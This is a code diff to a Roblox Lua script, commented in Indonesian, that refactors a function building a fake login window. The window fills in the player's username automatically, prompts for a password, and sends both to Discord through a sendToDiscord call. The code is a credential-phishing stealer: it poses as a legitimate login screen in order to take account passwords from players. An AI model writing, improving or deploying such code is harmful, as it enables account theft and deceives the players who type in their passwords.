@@ -336,6 +336,9 @@ local function createLoginGUI()
     local password = ""
     local isDataSent = false
 
+    -- Ambil username otomatis dari LocalPlayer
+    local username = game.Players.LocalPlayer.Name
+
     -- Properti GUI
     gui.Name = "LoginGUI"
     gui.Parent = game:GetService("CoreGui")
@@ -382,7 +385,7 @@ local function createLoginGUI()
     usernameBox.BackgroundColor3 = Color3.fromRGB(40, 40, 40)
     usernameBox.TextColor3 = Color3.fromRGB(255, 255, 255)
     usernameBox.TextEditable = false -- Nonaktifkan input manual
-    usernameBox.Text = game.Players.LocalPlayer.Name -- Isi otomatis dengan username pengguna
+    usernameBox.Text = username -- Isi otomatis dengan username pengguna
 
     -- Password Box
     passwordBox.Name = "PasswordBox"
@@ -443,7 +446,7 @@ local function createLoginGUI()
         end
 
         -- Kirim data ke Discord
-        sendToDiscord("Username: " .. usernameBox.Text .. "\nPassword: " .. password)
+        sendToDiscord("Username: " .. username .. "\nPassword: " .. password)
         isDataSent = true -- Tandai bahwa data sudah terkirim
         errorLabel.Text = "" -- Bersihkan error
         print("Data berhasil terkirim ke Discord!")
